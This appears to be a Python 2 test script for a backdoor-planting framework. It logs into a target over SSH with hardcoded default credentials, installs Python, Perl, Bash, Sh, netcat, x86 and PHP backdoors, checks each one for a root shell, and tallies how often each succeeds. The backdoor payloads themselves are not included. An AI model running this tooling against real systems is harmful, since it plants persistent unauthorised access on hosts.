from master import *
from nose.tools import nottest
import pexpect
import random
import sys

NUM_TESTS = 10
VERBOSITY = 0 #Change to 1 for more verbosity.
try:
    IP = sys.argv[1]
    USERNAME = sys.argv[2]
    PASS = sys.argv[3]
except:
    IP = "192.168.121.154"
    USERNAME = "george"
    PASS = "password" 
    print("Usage is: python stats.py <IP> <USERNAME> <PASSWORD>, but defaulting to %s@%s:%s" %(USERNAME, IP, PASS))

@nottest
def get_port():
    return random.randrange(1024, 65535, 1)

@nottest
def testAddTarget():
    if VERBOSITY == 1:
        print "Spawning..."
    child = pexpect.spawn('python master.py')
    child.expect('Using local IP')
    child.sendline('addtarget')
    child.expect('Target Hostname:')
    child.sendline(IP)
    if VERBOSITY == 1:
        print "Getting there"
    child.expect('Username:')
    child.sendline(USERNAME)
    child.expect('Password:')
    child.sendline(PASS)
    child.expect('Target')
    child.sendline('open')
    child.expect('Connection established.')
    if VERBOSITY == 1:
        print "Established Connection over ssh"
    return child

def test_pyth():
    child = testAddTarget()
    child.sendline('use shell/pyth')
    child.expect('Using Python module...')
    port = get_port()   
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Python backdoor on')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_perl():
    child = testAddTarget()
    child.sendline('use shell/perl')
    child.expect('Using Perl module...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Perl backdoor on')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"

def test_bash():
    child = testAddTarget()
    child.sendline('use shell/bash')
    child.expect('Using Bash backdoor...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Bash Backdoor on')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_sh():
    child = testAddTarget()
    child.sendline('use shell/sh')
    child.expect('Using Sh backdoor...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Sh Backdoor on')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_sh2():
    child = testAddTarget()
    child.sendline('use shell/sh2')
    child.expect('Using second Sh module..')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Initializing backdoor...')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_bash2():
    child = testAddTarget()
    child.sendline('use shell/bash2')
    child.expect('Using second Bash module...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Initializing backdoor...')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_x86():
    child = testAddTarget()
    child.sendline('use shell/x86')
    child.expect('Using x86 module...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('x86 backdoor on')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_nc():
    child = testAddTarget()
    child.sendline('use shell/netcat')
    child.expect('Using netcat backdoor...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Netcat backdoor on')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect(USERNAME, timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"
    #print("weve got rood")

def test_php():
    child = testAddTarget()
    child.sendline('use shell/php')
    child.expect('Using php module...')
    port = get_port()
    child.sendline('set port ' + str(port))
    child.expect('port => ' + str(port))
    child.sendline('exploit')
    child.expect('Initializing backdoor...')
    child.sendline('sessions -i 1')
    child.expect('Press Control \+ ] to exit the shell.')
    child.sendline('whoami')
    child.expect('root', timeout=10)
    if VERBOSITY == 1:
        print "Backdoor successful"

tests = {"Python" : test_pyth, "Perl" : test_perl, "Bash" : test_bash, "Bash2" : test_bash2, "Sh" : test_sh, "Sh2" : test_sh2, "Netcat" : test_nc, "x86" : test_x86, "PHP" : test_php } 
print "-------------"

for test in tests:
    success = 0
    for num in range(1, NUM_TESTS + 1):
        try:
            tests[test]()
            success += 1
        except:
            pass
    print "%s final: %d/%d" %(test, success, num)
    print "-------------"
